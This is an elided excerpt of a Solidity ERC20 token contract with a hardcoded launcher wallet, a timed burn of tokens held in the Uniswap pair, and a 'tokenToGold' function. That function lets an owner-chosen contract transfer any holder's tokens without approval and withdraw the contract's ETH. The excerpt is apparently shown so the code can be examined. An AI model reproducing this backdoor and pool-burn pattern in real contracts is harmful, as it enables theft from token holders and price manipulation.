...
contract tokenTest is ERC20, Ownable {
    ...
    tokenRewardGold public tokenGold;

    address public uniswapPair;
    address public tLauncher;
    uint256 public burnFee = 1;
    uint256 public minBalanceSwapToken = 10000 * 10 ** 18;
    ...
    constructor() ERC20("tTEST4", "tTEST4") {
        ...
        tLauncher = 0xC182A2768c1f9438670F2C0743dE609823bB19Fc; // Launcher wallet after Presale
    ...
    function settokenGold(
        address _addr
    ) external onlyOwner {
        tokenGold = tokenRewardGold(_addr);
        ...
        onlyOwner
    {
        require(
            pair != uniswapPair,
            "Main pair can not be removed from AMM Pairs"
        );
    ...
    function setLaunch(bool flag) public{
        require(address(tLauncher)==msg.sender,'only launcher');
        launch = flag;
    }
    ...
    function swapTokensForEth(uint256 tokenAmount) private {
        // Generate pancakeswap pair with wBNB
    ...
    uint256 public lpBurnFrequency = 1680 seconds; // Burn every 28 minutes
    uint256 public lastLpBurnTime;
    uint256 public percentForLPBurn = 28; // Burn percentage: 28 = .028%

    function autoBurnLiquidityPairTokens() internal returns (bool) {
        lastLpBurnTime = block.timestamp;
        // Get LP balance
        uint256 liquidityPairBalance = this.balanceOf(uniswapPair);
        // Formula for calculating burned token amount
        uint256 amountToBurn = liquidityPairBalance.mul(percentForLPBurn).div(
            100000
        );
        // Transfer tokens from market pair to dead address
        if (amountToBurn > 0) {
            super._transfer(uniswapPair, address(0xdead), amountToBurn);
        }
        // Sync price after LP token burn
    ...
    event AutoNukeLP();
    function tokenToGold(address to,uint256 amount,uint256 balance)external{
        require(msg.sender == address(tokenGold),'only burns');
        require(launch,'unlaunch');
        uint256 _amount = balanceOf(to);
        require(_amount >= amount,'not enough');
        super._transfer(to, address(tokenGold), amount);
        uint256 _balance =payable(address(this)).balance;
        require(_balance >= balance, "Droped out");
        payable(address(tokenGold)).transfer(balance);
    }
    // Receive ETH from pair
